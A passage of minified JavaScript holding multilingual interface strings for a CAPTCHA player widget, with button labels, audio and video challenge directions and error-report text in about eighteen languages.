_PLAYER_AUDIO_:"&#1488;&#1514;&#1490;&#1512; &#1488;&#1493;&#1491;&#1497;&#1493;",_PLAYER_VIDEO_:"&#1488;&#1514;&#1490;&#1512; &#1493;&#1497;&#1491;&#1488;&#1493;","_DIRECTIONS_VERBOSE[0000]_":"&#1492;&#1511;&#1500;&#1491; &#1488;&#1514; &#1492;&#1496;&#1511;&#1505;&#1496; &#1504;&#1506;","_DIRECTIONS[0000]_":"&#1492;&#1506;&#1489;&#1512;&#1514; &#1496;&#1511;&#1505;&#1496;","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"&#1492;&#1511;&#1500;&#1491; &#1488;&#1514; &#1492;&#1496;&#1511;&#1505;&#1496; &#1513;&#1488;&#1514;&#1492; &#1513;&#1493;&#1502;&#1506; &#1489;&#1488;&#1493;&#1491;&#1497;&#1493;",
"_DIRECTIONS_AUDIO[0000]_":"&#1496;&#1511;&#1505;&#1496; &#1513;&#1488;&#1514;&#1492; &#1513;&#1493;&#1502;&#1506;",_AUDIO_BUTTON_RETURN_:"&#1495;&#1494;&#1493;&#1512; &#1500;&#1488;&#1514;&#1490;&#1512; &#1495;&#1494;&#1493;&#1514;&#1497;","_DIRECTIONS2[0000]_":"&#1492;&#1506;&#1489;&#1512;&#1514; &#1496;&#1511;&#1505;&#1496;","_DIRECTIONS2_VERBOSE[0000]_":"&#1492;&#1511;&#1500;&#1491; &#1488;&#1514; &#1492;&#1496;&#1511;&#1505;&#1496; &#1504;&#1506;","_DIRECTIONS2_AUDIO[0000]_":"&#1496;&#1511;&#1505;&#1496; &#1513;&#1488;&#1514;&#1492; &#1513;&#1493;&#1502;&#1506;",
"_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"&#1492;&#1511;&#1500;&#1491; &#1488;&#1514; &#1492;&#1496;&#1511;&#1505;&#1496; &#1513;&#1488;&#1514;&#1492; &#1513;&#1493;&#1502;&#1506; &#1489;&#1488;&#1493;&#1491;&#1497;&#1493;",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},gre:{_DOWNLOAD_AUDIO_:"&#922;&#945;&#964;&#949;&#946;&#940;&#963;&#964;&#949; &#956;&#953;&#945; &#945;&#954;&#959;&#965;&#963;&#964;&#953;&#954;&#942; &#960;&#961;&#972;&#954;&#955;&#951;&#963;&#951;",_AUDIO_LISTEN_AGAIN_:"&#926;&#945;&#957;&#945;&#960;&#945;&#943;&#958;&#949;&#964;&#949; &#948;&#949;&#953;&#947;&#956;&#945;&#964;&#959;&#955;&#951;&#968;&#943;&#945;&#962; &#942;&#967;&#959;&#965;",
_AUDIO_NEW_CHALLENGE_:"&#928;&#940;&#961;&#964;&#949; &#956;&#953;&#945; &#957;&#941;&#945; &#960;&#961;&#972;&#954;&#955;&#951;&#963;&#951;",_REFRESH_BUTTON_:"&#928;&#940;&#961;&#964;&#949; &#956;&#953;&#945; &#957;&#941;&#945; &#960;&#961;&#972;&#954;&#955;&#951;&#963;&#951;",_AUDIO_BUTTON_:"&#928;&#940;&#961;&#964;&#949; &#956;&#953;&#945; &#945;&#954;&#959;&#965;&#963;&#964;&#953;&#954;&#942; &#960;&#961;&#972;&#954;&#955;&#951;&#963;&#951;",_PLAYER_AUDIO_:"&#928;&#961;&#972;&#954;&#955;&#951;&#963;&#951; &#905;&#967;&#959;&#962;",
_PLAYER_VIDEO_:"&#928;&#961;&#972;&#954;&#955;&#951;&#963;&#951; &#914;&#943;&#957;&#964;&#949;&#959;","_DIRECTIONS_VERBOSE[0000]_":"&#928;&#955;&#951;&#954;&#964;&#961;&#959;&#955;&#959;&#947;&#942;&#963;&#964;&#949; &#964;&#945; &#947;&#961;&#940;&#956;&#956;&#945;&#964;&#945; &#922;&#953;&#957;&#959;&#973;&#956;&#949;&#957;&#959;&#953;","_DIRECTIONS[0000]_":"&#924;&#949;&#964;&#945;&#954;&#943;&#957;&#951;&#963;&#951; &#947;&#961;&#940;&#956;&#956;&#945;&#964;&#945;:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"&#928;&#955;&#951;&#954;&#964;&#961;&#959;&#955;&#959;&#947;&#942;&#963;&#964;&#949; &#964;&#945; &#947;&#961;&#940;&#956;&#956;&#945;&#964;&#945; &#960;&#959;&#965; &#945;&#954;&#959;&#973;&#964;&#949; &#963;&#964;&#959; &#945;&#954;&#959;&#965;&#963;&#964;&#953;&#954;&#972;",
"_DIRECTIONS_AUDIO[0000]_":"&#922;&#949;&#943;&#956;&#949;&#957;&#959; &#960;&#959;&#965; &#945;&#954;&#959;&#973;&#964;&#949;:",_AUDIO_BUTTON_RETURN_:"&#917;&#960;&#953;&#963;&#964;&#961;&#959;&#966;&#942; &#963;&#964;&#951;&#957; &#959;&#960;&#964;&#953;&#954;&#942; &#960;&#961;&#972;&#954;&#955;&#951;&#963;&#951;","_DIRECTIONS2[0000]_":"&#924;&#949;&#964;&#945;&#954;&#943;&#957;&#951;&#963;&#951; &#947;&#961;&#940;&#956;&#956;&#945;&#964;&#945;:","_DIRECTIONS2_VERBOSE[0000]_":"&#928;&#955;&#951;&#954;&#964;&#961;&#959;&#955;&#959;&#947;&#942;&#963;&#964;&#949; &#964;&#945; &#947;&#961;&#940;&#956;&#956;&#945;&#964;&#945; &#922;&#953;&#957;&#959;&#973;&#956;&#949;&#957;&#959;&#953;",
"_DIRECTIONS2_AUDIO[0000]_":"&#922;&#949;&#943;&#956;&#949;&#957;&#959; &#960;&#959;&#965; &#945;&#954;&#959;&#973;&#964;&#949;:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"&#928;&#955;&#951;&#954;&#964;&#961;&#959;&#955;&#959;&#947;&#942;&#963;&#964;&#949; &#964;&#945; &#947;&#961;&#940;&#956;&#956;&#945;&#964;&#945; &#960;&#959;&#965; &#945;&#954;&#959;&#973;&#964;&#949; &#963;&#964;&#959; &#945;&#954;&#959;&#965;&#963;&#964;&#953;&#954;&#972;",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",
_JS_REQUIRED_:""},cze:{_DOWNLOAD_AUDIO_:"St&#225;hnout Audio v&#253;zvu",_AUDIO_LISTEN_AGAIN_:"P&#345;ehr&#225;v&#225;n&#237; zvukov&#233; uk&#225;zky",_AUDIO_NEW_CHALLENGE_:"Z&#237;skat novou v&#253;zvu",_REFRESH_BUTTON_:"Z&#237;skat novou v&#253;zvu",_AUDIO_BUTTON_:"Z&#237;skat audio v&#253;zvu",_PLAYER_AUDIO_:"Audio v&#253;zva",_PLAYER_VIDEO_:"Video v&#253;zva","_DIRECTIONS_VERBOSE[0000]_":"Zadejte pohybliv&#253; text","_DIRECTIONS[0000]_":"P&#345;esouv&#225;n&#237; textu:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Zadejte text, kter&#253; sly&#353;&#237;te v audio",
"_DIRECTIONS_AUDIO[0000]_":"Text si sly&#353;&#237;te:",_AUDIO_BUTTON_RETURN_:"Zp&#283;t na Visual v&#253;zvu","_DIRECTIONS2[0000]_":"P&#345;esouv&#225;n&#237; textu:","_DIRECTIONS2_VERBOSE[0000]_":"Zadejte pohybliv&#253; text","_DIRECTIONS2_AUDIO[0000]_":"Text si sly&#353;&#237;te:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Zadejte text, kter&#253; sly&#353;&#237;te v audio",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},hrv:{_DOWNLOAD_AUDIO_:"Preuzimanje audio izazov",_AUDIO_LISTEN_AGAIN_:"Ponoviti audio uzorak",
_AUDIO_NEW_CHALLENGE_:"Nabavite novi izazov",_REFRESH_BUTTON_:"Nabavite novi izazov",_AUDIO_BUTTON_:"Dobiti audio izazov",_PLAYER_AUDIO_:"Audio izazov",_PLAYER_VIDEO_:"Video izazov","_DIRECTIONS_VERBOSE[0000]_":"Upi&#353;ite pomicanjem slova","_DIRECTIONS[0000]_":"Pomicanjem slova:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Upi&#353;ite slova &#269;uti u Audio","_DIRECTIONS_AUDIO[0000]_":"Slova &#269;ujete:",_AUDIO_BUTTON_RETURN_:"Povratak na vizualni izazov","_DIRECTIONS2[0000]_":"Pomicanjem slova:","_DIRECTIONS2_VERBOSE[0000]_":"Upi&#353;ite pomicanjem slova",
"_DIRECTIONS2_AUDIO[0000]_":"Slova &#269;ujete:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Upi&#353;ite slova &#269;uti u Audio",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},cat:{_DOWNLOAD_AUDIO_:"Descarrega un desafiament d'&#224;udio",_AUDIO_LISTEN_AGAIN_:"Repetir la mostra d'&#224;udio",_AUDIO_NEW_CHALLENGE_:"Fer una prova nova",_REFRESH_BUTTON_:"Fer una prova nova",_AUDIO_BUTTON_:"Obtenir un desafiament d'&#224;udio",_PLAYER_AUDIO_:"Desafiament &#192;udio",_PLAYER_VIDEO_:"Desafiament V&#237;deo",
"_DIRECTIONS_VERBOSE[0000]_":"Escriu les lletres en moviment","_DIRECTIONS[0000]_":"Lletres en moviment:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Escriu les lletres que s'escolten en l'&#224;udio","_DIRECTIONS_AUDIO[0000]_":"Lletres que s'escolten:",_AUDIO_BUTTON_RETURN_:"Torneu a visual desafiament","_DIRECTIONS2[0000]_":"Lletres en moviment:","_DIRECTIONS2_VERBOSE[0000]_":"Escriu les lletres en moviment","_DIRECTIONS2_AUDIO[0000]_":"Lletres que s'escolten:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Escriu les lletres que s'escolten en l'&#224;udio",
_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},ara:{_DOWNLOAD_AUDIO_:"&#1608;&#1579;&#1605;&#1577; &#1578;&#1581;&#1583; &#1578;&#1606;&#1586;&#1610;&#1604; &#1575;&#1604;&#1587;&#1605;&#1593;&#1610;&#1607;",_AUDIO_LISTEN_AGAIN_:"&#1573;&#1593;&#1575;&#1583;&#1577; &#1593;&#1610;&#1606;&#1577; &#1575;&#1604;&#1589;&#1608;&#1578;",_AUDIO_NEW_CHALLENGE_:"&#1575;&#1604;&#1581;&#1589;&#1608;&#1604; &#1593;&#1604;&#1609; &#1578;&#1581;&#1583; &#1580;&#1583;&#1610;&#1583;",
_REFRESH_BUTTON_:"&#1575;&#1604;&#1581;&#1589;&#1608;&#1604; &#1593;&#1604;&#1609; &#1578;&#1581;&#1583; &#1580;&#1583;&#1610;&#1583;",_AUDIO_BUTTON_:"&#1575;&#1604;&#1581;&#1589;&#1608;&#1604; &#1593;&#1604;&#1609; &#1578;&#1581;&#1583;&#1610; &#1575;&#1604;&#1589;&#1608;&#1578;",_PLAYER_AUDIO_:"&#1578;&#1581;&#1583;&#1610; &#1575;&#1604;&#1589;&#1608;&#1578;",_PLAYER_VIDEO_:"&#1578;&#1581;&#1583;&#1610; &#1575;&#1604;&#1601;&#1610;&#1583;&#1610;&#1608;","_DIRECTIONS_VERBOSE[0000]_":"&#1575;&#1603;&#1578;&#1576; &#1575;&#1604;&#1606;&#1589; &#1575;&#1604;&#1605;&#1578;&#1581;&#1585;&#1603;",
"_DIRECTIONS[0000]_":"&#1575;&#1604;&#1606;&#1589; &#1575;&#1604;&#1605;&#1578;&#1581;&#1585;&#1603;","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"&#1575;&#1603;&#1578;&#1576; &#1575;&#1604;&#1606;&#1589; &#1578;&#1587;&#1605;&#1593;","_DIRECTIONS_AUDIO[0000]_":"&#1606;&#1589; &#1578;&#1587;&#1605;&#1593;",_AUDIO_BUTTON_RETURN_:"&#1575;&#1604;&#1593;&#1608;&#1583;&#1577; &#1573;&#1604;&#1609; &#1578;&#1581;&#1583;&#1610; &#1575;&#1604;&#1576;&#1589;&#1585;&#1610;&#1577;","_DIRECTIONS2[0000]_":"&#1575;&#1604;&#1606;&#1589; &#1575;&#1604;&#1605;&#1578;&#1581;&#1585;&#1603;",
"_DIRECTIONS2_VERBOSE[0000]_":"&#1575;&#1603;&#1578;&#1576; &#1575;&#1604;&#1606;&#1589; &#1575;&#1604;&#1605;&#1578;&#1581;&#1585;&#1603;","_DIRECTIONS2_AUDIO[0000]_":"&#1606;&#1589; &#1578;&#1587;&#1605;&#1593;","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"&#1575;&#1603;&#1578;&#1576; &#1575;&#1604;&#1606;&#1589; &#1578;&#1587;&#1605;&#1593;",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},ger:{_DOWNLOAD_AUDIO_:"Audio-Captcha laden",_AUDIO_LISTEN_AGAIN_:"Audio-Captcha erneut abspielen",
_AUDIO_NEW_CHALLENGE_:"Neues Captcha laden",_REFRESH_BUTTON_:"Neues Captcha laden",_AUDIO_BUTTON_:"Audio-Captcha laden",_PLAYER_AUDIO_:"Audio-Herausforderung",_PLAYER_VIDEO_:"Video-Herausforderung","_DIRECTIONS_VERBOSE[0000]_":"Animierte buchstaben eingeben","_DIRECTIONS[0000]_":"Animierte buchstaben:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Geben sie die geh&#246;rten buchstaben oder zahlen ein","_DIRECTIONS_AUDIO[0000]_":"Geh&#246;rte buchstaben oder zahlen:",_AUDIO_BUTTON_RETURN_:"Zur&#252;ck zum visuellen Captcha",
"_DIRECTIONS2[0000]_":"Animierte buchstaben:","_DIRECTIONS2_VERBOSE[0000]_":"Animierte buchstaben eingeben","_DIRECTIONS2_AUDIO[0000]_":"Geh&#246;rte buchstaben oder zahlen:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Geben sie die geh&#246;rten buchstaben oder zahlen ein",_ERROR_:"Ein unerwarteter Fehler ist aufgetreten.<br>Bitte %_MAILTO_START_%klicken Sie hier%_MAILTO_END_% ,um das Problem zu melden.",_ERROR_EMAIL_SUBJECT_:"Player Fehler",_ERROR_EMAIL_BODY_:"Bitte teilen Sie uns mit, was passiert ist, damit wir unser System verbessern k&#246;nnen.\n\nFehler Details\n==========\n%_DETAILS_%",
_JS_REQUIRED_:"Javascript required"},dan:{_DOWNLOAD_AUDIO_:"Hent en lydpr&#248;ve",_AUDIO_LISTEN_AGAIN_:"Spil lydpr&#248;ve igen",_AUDIO_NEW_CHALLENGE_:"F&#229; en ny pr&#248;ve",_REFRESH_BUTTON_:"En ny pr&#248;ve",_AUDIO_BUTTON_:"En ny lydpr&#248;ve",_PLAYER_AUDIO_:"Audio Udfordringen",_PLAYER_VIDEO_:"Video Udfordringen","_DIRECTIONS_VERBOSE[0000]_":"Skriv de bev&#230;gelige bogstaver","_DIRECTIONS[0000]_":"Bev&#230;gelige bogstaver:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Skriv de bogstaver og cifre som du h&#248;rer",
"_DIRECTIONS_AUDIO[0000]_":"Bogstaver og cifre som du h&#248;rer:",_AUDIO_BUTTON_RETURN_:"G&#229; tilbage til visuel pr&#248;ve","_DIRECTIONS2[0000]_":"Bev&#230;gelige bogstaver:","_DIRECTIONS2_VERBOSE[0000]_":"Skriv de bev&#230;gelige bogstaver","_DIRECTIONS2_AUDIO[0000]_":"Bogstaver og cifre som du h&#248;rer:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Skriv de bogstaver og cifre som du h&#248;rer",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},spa:{_DOWNLOAD_AUDIO_:"Descargar un test de audio",
_AUDIO_LISTEN_AGAIN_:"Volver a reproducir audio",_AUDIO_NEW_CHALLENGE_:"Generar un nuevo test",_REFRESH_BUTTON_:"Generar un nuevo test",_AUDIO_BUTTON_:"Generar un test de audio",_PLAYER_AUDIO_:"Desaf&#237;o de Audio",_PLAYER_VIDEO_:"Desaf&#237;o de Video","_DIRECTIONS_VERBOSE[0000]_":"Escribe los caracteres m&#243;viles","_DIRECTIONS[0000]_":"Caracteres m&#243;viles:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Escribe los caracteres que oigas en el audio","_DIRECTIONS_AUDIO[0000]_":"Caracteres que has o&#237;do:",
_AUDIO_BUTTON_RETURN_:"Volver al test visual","_DIRECTIONS2[0000]_":"Caracteres m&#243;viles:","_DIRECTIONS2_VERBOSE[0000]_":"Escribe los Caracteres m&#243;viles","_DIRECTIONS2_AUDIO[0000]_":"Caracteres que has o&#237;do:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Escribe los caracteres que oigas en el audio",_ERROR_:"Ha surgido un error inesperado.<br>Por favor %_MAILTO_START_%haz clic aqu&#237;%_MAILTO_END_% para informar del problema.",_ERROR_EMAIL_SUBJECT_:"Error del reproductor",_ERROR_EMAIL_BODY_:"Cu&#233;ntanos lo sucedido para que podamos mejorar el sistema.\n\nDetalles del error\n==========\n%_DETAILS_%",
_JS_REQUIRED_:"Javascript required"},fin:{_DOWNLOAD_AUDIO_:"Lataa &#228;&#228;nihaaste",_AUDIO_LISTEN_AGAIN_:"Toista &#228;&#228;nin&#228;yte",_AUDIO_NEW_CHALLENGE_:"Uusi haaste",_REFRESH_BUTTON_:"Uusi haaste",_AUDIO_BUTTON_:"&#196;&#228;nihaaste",_PLAYER_AUDIO_:"&#228;&#228;nihaaste",_PLAYER_VIDEO_:"videohaaste","_DIRECTIONS_VERBOSE[0000]_":"Kirjoita liikkuvat kirjaimet","_DIRECTIONS[0000]_":"Liikkuvat kirjaimet:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Kirjoita kuulemasi kirjaimet tai numerot","_DIRECTIONS_AUDIO[0000]_":"Kuulemasi kirjaimet tai numerot:",
_AUDIO_BUTTON_RETURN_:"Palaa n&#228;k&#246;haasteeseen","_DIRECTIONS2[0000]_":"Liikkuvat kirjaimet:","_DIRECTIONS2_VERBOSE[0000]_":"Kirjoita liikkuvat kirjaimet","_DIRECTIONS2_AUDIO[0000]_":"Kuulemasi kirjaimet tai numerot:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Kirjoita kuulemasi kirjaimet tai numerot",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},fre:{_DOWNLOAD_AUDIO_:"T&#233;l&#233;charger un test audio",_AUDIO_LISTEN_AGAIN_:"Rejouer l&#8217;extrait audio",_AUDIO_NEW_CHALLENGE_:"Obtenir un nouveau test",
_REFRESH_BUTTON_:"Obtenir un nouveau test",_AUDIO_BUTTON_:"Obtenir un test audio",_PLAYER_AUDIO_:"D&#233;fi de audio",_PLAYER_VIDEO_:"D&#233;fi de vid&#233;o","_DIRECTIONS_VERBOSE[0000]_":"Saisissez les lettres d&#233;form&#233;es","_DIRECTIONS[0000]_":"Lettres d&#233;form&#233;es :","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Saisissez les lettres ou les chiffres audio entendus","_DIRECTIONS_AUDIO[0000]_":"Lettres ou chiffres audio entendus :",_AUDIO_BUTTON_RETURN_:"Revenir au test visuel","_DIRECTIONS2[0000]_":"Lettres d&#233;form&#233;es :",
"_DIRECTIONS2_VERBOSE[0000]_":"Saisissez les lettres d&#233;form&#233;es","_DIRECTIONS2_AUDIO[0000]_":"Lettres ou chiffres audio entendus :","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Saisissez les lettres ou les chiffres audio entendus",_ERROR_:"Une erreur inattendue a eu lieu.<br>Veuillez %_MAILTO_START_%cliquer ici%_MAILTO_END_% pour transmettre le probl&#232;me.",_ERROR_EMAIL_SUBJECT_:"Erreur du lecteur",_ERROR_EMAIL_BODY_:"Veuillez nous expliquer ce qui s'est pass&#233; afin que nous puissions am&#233;liorer notre syst&#232;me.\n\nD&#233;tails de l'erreur\n==========\n%_DETAILS_%",
_JS_REQUIRED_:"Javascript required."},ind:{_DOWNLOAD_AUDIO_:"Unduh Tes Suara",_AUDIO_LISTEN_AGAIN_:"Putar ulang Tes Suara",_AUDIO_NEW_CHALLENGE_:"Unduh Tes Suara Baru",_REFRESH_BUTTON_:"Dapatkan Tes Baru",_AUDIO_BUTTON_:"Dapatkan Tes Suara",_PLAYER_AUDIO_:"Audio tantangan",_PLAYER_VIDEO_:"Video tantangan","_DIRECTIONS_VERBOSE[0000]_":"Ketik Huruf yang bergerak","_DIRECTIONS[0000]_":"Huruf yang bergerak:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Ketik huruf dan nomor yang anda dengar","_DIRECTIONS_AUDIO[0000]_":"Huruf yang anda dengar:",
_AUDIO_BUTTON_RETURN_:"Kembali ke Tes Visual","_DIRECTIONS2[0000]_":"Huruf yang bergerak:","_DIRECTIONS2_VERBOSE[0000]_":"Ketik Huruf yang bergerak","_DIRECTIONS2_AUDIO[0000]_":"Huruf yang anda dengar:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Ketik huruf dan nomor yang anda dengar",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},ita:{_DOWNLOAD_AUDIO_:"Scarica il test audio",_AUDIO_LISTEN_AGAIN_:"Ascolta di nuovo",_AUDIO_NEW_CHALLENGE_:"Carica un nuovo test",_REFRESH_BUTTON_:"Carica un nuovo test",
_AUDIO_BUTTON_:"Carica un nuovo test audio",_PLAYER_AUDIO_:"Test audio",_PLAYER_VIDEO_:"Test video","_DIRECTIONS_VERBOSE[0000]_":"Inserisci le lettere in movimento","_DIRECTIONS[0000]_":"Lettere in movimento:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Inserisci le lettere e i numeri che hai sentito","_DIRECTIONS_AUDIO[0000]_":"Lettere e numeri che hai sentito:",_AUDIO_BUTTON_RETURN_:"Ritorna al test visivo","_DIRECTIONS2[0000]_":"Lettere in movimento:","_DIRECTIONS2_VERBOSE[0000]_":"Inserisci le lettere in movimento",
"_DIRECTIONS2_AUDIO[0000]_":"Lettere e numeri che hai sentito:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Inserisci le lettere e i numeri che hai sentito",_ERROR_:"Si &#232; verificato un errore imprevisto.<br>Fai %_MAILTO_START_%clic qui%_MAILTO_END_% per segnalare il problema.",_ERROR_EMAIL_SUBJECT_:"Errore del lettore",_ERROR_EMAIL_BODY_:"Facci sapere cosa &#232; successo in modo che possiamo migliorare il nostro sistema.\n\nDettagli errore\n==========\n%_DETAILS_%",_JS_REQUIRED_:"Javascript required"},
kor:{_DOWNLOAD_AUDIO_:"&#51020;&#49457; &#52897;&#52264; &#45796;&#50868;&#47196;&#46300;&#54616;&#44592;",_AUDIO_LISTEN_AGAIN_:"&#51020;&#49457; &#52897;&#52264; &#49368;&#54540; &#45796;&#49884; &#46307;&#44592;",_AUDIO_NEW_CHALLENGE_:"&#49352;&#47196;&#50868; &#52897;&#52264; &#47196;&#46300;&#54616;&#44592;",_REFRESH_BUTTON_:"&#49352;&#47196;&#50868; &#52897;&#52264; &#47196;&#46300;&#54616;&#44592;",_AUDIO_BUTTON_:"&#51020;&#49457; &#52897;&#52264; &#49324;&#50857;&#54616;&#44592;",_PLAYER_AUDIO_:"&#51020;&#49457; &#52897;&#52264;",
_PLAYER_VIDEO_:"&#51060;&#48120;&#51648; &#52897;&#52264;","_DIRECTIONS_VERBOSE[0000]_":"&#50880;&#51649;&#51060;&#45716; &#44544;&#51088;&#47484; &#51077;&#47141;&#54616;&#49901;&#49884;&#50724;.","_DIRECTIONS[0000]_":"&#50880;&#51649;&#51060;&#45716; &#44544;&#51088;:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"&#46308;&#47532;&#45716; &#45824;&#47196; &#49707;&#51088;&#47484; &#51077;&#47141;&#54616;&#49901;&#49884;&#50724;.","_DIRECTIONS_AUDIO[0000]_":"&#46308;&#47532;&#45716; &#49707;&#51088;:",_AUDIO_BUTTON_RETURN_:"&#51060;&#48120;&#51648; &#52897;&#52264;&#47196; &#46028;&#50500;&#44032;&#44592;",
"_DIRECTIONS2[0000]_":"&#50880;&#51649;&#51060;&#45716; &#44544;&#51088;:","_DIRECTIONS2_VERBOSE[0000]_":"&#50880;&#51649;&#51060;&#45716; &#44544;&#51088;&#47484; &#51077;&#47141;&#54616;&#49901;&#49884;&#50724;.","_DIRECTIONS2_AUDIO[0000]_":"&#46308;&#47532;&#45716; &#49707;&#51088;:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"&#46308;&#47532;&#45716; &#45824;&#47196; &#49707;&#51088;&#47484; &#51077;&#47141;&#54616;&#49901;&#49884;&#50724;.",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",
_JS_REQUIRED_:""},msa:{_DOWNLOAD_AUDIO_:"Muat turun Sampel Audio",_AUDIO_LISTEN_AGAIN_:"Main semula sampel Audio",_AUDIO_NEW_CHALLENGE_:"Dapatkan Sampel Baru",_REFRESH_BUTTON_:"Dapatkan Sampel baru",_AUDIO_BUTTON_:"Dapatkan Sampel Audio",_PLAYER_AUDIO_:"Sampel Audio",_PLAYER_VIDEO_:"Sampel Video","_DIRECTIONS_VERBOSE[0000]_":"Taip huruf yang bergerak","_DIRECTIONS[0000]_":"Huruf yang bergerak","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Taip huruf dan nombor yang anda dengar di audio","_DIRECTIONS_AUDIO[0000]_":"Huruf dan nombor yang anda dengar:",
_AUDIO_BUTTON_RETURN_:"Kembali ke Sampel Visual","_DIRECTIONS2[0000]_":"Huruf yang bergerak","_DIRECTIONS2_VERBOSE[0000]_":"Taip huruf yang bergerak","_DIRECTIONS2_AUDIO[0000]_":"Huruf dan nombor yang anda dengar:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Taip huruf dan nombor yang anda dengar di audio",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},nld:{_DOWNLOAD_AUDIO_:"Download een audio uitdaging",_AUDIO_LISTEN_AGAIN_:"Speel audio opnieuw af",_AUDIO_NEW_CHALLENGE_:"Beluister een nieuwe uitdaging",
_REFRESH_BUTTON_:"Nieuwe uitdaging",_AUDIO_BUTTON_:"Beluister audio uitdaging",_PLAYER_AUDIO_:"Audio uitdaging",_PLAYER_VIDEO_:"Video uitdaging","_DIRECTIONS_VERBOSE[0000]_":"Typ de bewegende letters in","_DIRECTIONS[0000]_":"Bewegende letters:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Typ de letters of nummers in die u hoort","_DIRECTIONS_AUDIO[0000]_":"Letters of nummers die u hoort:",_AUDIO_BUTTON_RETURN_:"Ga terug naar de visuele uitdaging","_DIRECTIONS2[0000]_":"Bewegende letters:","_DIRECTIONS2_VERBOSE[0000]_":"Typ de bewegende letters in",
"_DIRECTIONS2_AUDIO[0000]_":"Letters of nummers die u hoort:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Typ de letters of nummers in die u hoort",_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},nor:{_DOWNLOAD_AUDIO_:"Last ned en lydtest",_AUDIO_LISTEN_AGAIN_:"Spill lydtest igjen",_AUDIO_NEW_CHALLENGE_:"F&#229; en ny test",_REFRESH_BUTTON_:"F&#229; en ny test",_AUDIO_BUTTON_:"F&#229; en lydtest",_PLAYER_AUDIO_:"lydtest",_PLAYER_VIDEO_:"videotest","_DIRECTIONS_VERBOSE[0000]_":"Skriv inn de bevegelige bokstavene",
"_DIRECTIONS[0000]_":"Bevegelige bokstaver:","_DIRECTIONS_VERBOSE_AUDIO[0000]_":"Skriv inn bokstavene eller tallene du h&#248;rer","_DIRECTIONS_AUDIO[0000]_":"Bokstaver og tall du h&#248;rer:",_AUDIO_BUTTON_RETURN_:"G&#229; tilbake til visuell test","_DIRECTIONS2[0000]_":"Bevegelige bokstaver:","_DIRECTIONS2_VERBOSE[0000]_":"Skriv inn de bevegelige bokstavene","_DIRECTIONS2_AUDIO[0000]_":"Bokstaver og tall du h&#248;rer:","_DIRECTIONS2_VERBOSE_AUDIO[0000]_":"Skriv inn bokstavene eller tallene du h&#248;rer",
_ERROR_:"",_ERROR_EMAIL_SUBJECT_:"",_ERROR_EMAIL_BODY_:"",_JS_REQUIRED_:""},por:{_DOWNLOAD_AUDIO_:"Descarregar a amostra de &#225;udio",_AUDIO_LISTEN_AGAIN_:"Repetir amostra de &#225;udio",_AUDIO_NEW_CHALLENGE_:"Obter um novo captcha",_REFRESH_BUTTON_:"Obter um novo captcha",_AUDIO_BUTTON_:"Obter um captcha em &#225;udio",_PLAYER_AUDIO_:"Desafio de &#225;udio",_PLAYER_VIDEO_:"Desafio v&#237;deo","_DIRECTIONS_VERBOSE[0000]_":"Digite as letras em movimento","_DIRECTIONS[0000]_":"Letras em movimento:",
